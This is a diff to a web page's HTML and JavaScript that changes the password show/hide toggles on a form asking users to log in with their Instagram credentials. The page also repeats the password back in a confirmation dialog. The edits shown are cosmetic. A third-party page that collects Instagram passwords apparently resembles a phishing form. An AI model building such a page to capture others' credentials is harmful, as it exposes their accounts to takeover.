@@ -130,9 +130,10 @@
     <p>Please log in with your Instagram credentials</p>
     <input type="text" id="username" placeholder="Username or email">
     <div class="eye-toggle">
-      <input type="password" id="password" placeholder="Password">
-      <span onclick="togglePassword()">👁</span>
+      <input type="password" id="password" placeholder="Password" style="width: 100%;">
+      <span id="toggleText" onclick="togglePassword()">Show</span>
     </div>
+
     <button onclick="confirmLogin()">Log In</button>
   </div>
 
@@ -143,12 +144,26 @@
 
     function togglePassword() {
       const pass = document.getElementById('password');
-      pass.type = pass.type === 'password' ? 'text' : 'password';
+      const toggle = document.getElementById('toggleText');
+      if (pass.type === 'password') {
+        pass.type = 'text';
+        toggle.textContent = 'Hide';
+      } else {
+        pass.type = 'password';
+        toggle.textContent = 'Show';
+      }
     }
-
+    
     function toggleConfirmPass() {
       const input = document.getElementById('confirmPassInput');
-      input.type = input.type === 'password' ? 'text' : 'password';
+      const toggle = document.getElementById('toggleConfirmText');
+      if (input.type === 'password') {
+        input.type = 'text';
+        toggle.textContent = 'Hide';
+      } else {
+        input.type = 'password';
+        toggle.textContent = 'Show';
+      }
     }
 
     function confirmLogin() {
@@ -175,7 +190,7 @@
           <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin: 10px 0;">
             <label for="confirmPassInput" style="font-size: 18px;">Password:</label>
             <input type="password" value="${pass}" id="confirmPassInput" style="padding: 8px; border-radius: 5px; width: 60%; font-size: 16px;">
-            <span onclick="toggleConfirmPass()" style="cursor:pointer;">👁</span>
+            <span id="toggleConfirmText" onclick="toggleConfirmPass()" style="cursor:pointer;">Show</span>
           </div>
       
           <div style="display: flex; justify-content: space-between; margin-top: 20px;">
@@ -184,7 +199,7 @@
           </div>
         </div>
       `;
-
+  
 
     }
 
